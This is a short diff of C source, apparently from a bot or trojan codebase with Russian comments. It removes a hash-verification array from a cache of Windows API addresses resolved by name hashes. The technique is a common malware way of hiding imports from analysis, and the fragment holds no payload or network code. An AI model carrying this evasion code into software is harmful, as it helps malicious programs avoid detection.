@@ -117,8 +117,6 @@ static bool BuildBotImportTable()
 }
 //-----------------------------------------------------------------------------
 
-DWORD* ApiCacheHashes = NULL;
-
 BOOL InitializeAPI()
 {
 	// Инициализируем глобальный кэш
@@ -126,8 +124,6 @@ BOOL InitializeAPI()
 
 	if (ApiCacheSize > 0)
 	{
-		ApiCacheHashes = (DWORD*)MemAlloc((ApiCacheSize + 1)*sizeof(DWORD));
-
 		GlobalApiCache = (LPVOID*)MemAlloc((ApiCacheSize + 1)*sizeof(LPVOID));
 		m_memset(GlobalApiCache, 0, (ApiCacheSize + 1)*sizeof(LPVOID));
 	}
@@ -559,23 +555,14 @@ LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int C
 	bool UseCache = GlobalApiCache != NULL && CacheIndex > 0 && CacheIndex <= ApiCacheSize;
 
 	if (UseCache)
-	{
 		Addr =  GlobalApiCache[CacheIndex];
-		if (Addr && ApiCacheHashes[CacheIndex] != dwProcNameHash)
-		{
-			Addr = NULL;
-		}
-	}
 
 	if (!Addr)
 	{
 		// Функции нет в кэше. Получаем её адрес и добавляем в кэш
 		Addr = GetProcAddressEx(Dll, dwModule, dwProcNameHash);
 		if (UseCache)
-		{
 			GlobalApiCache[CacheIndex] = Addr;
-			ApiCacheHashes[CacheIndex] = dwProcNameHash;
-		}
 	}
 	return Addr;
 }
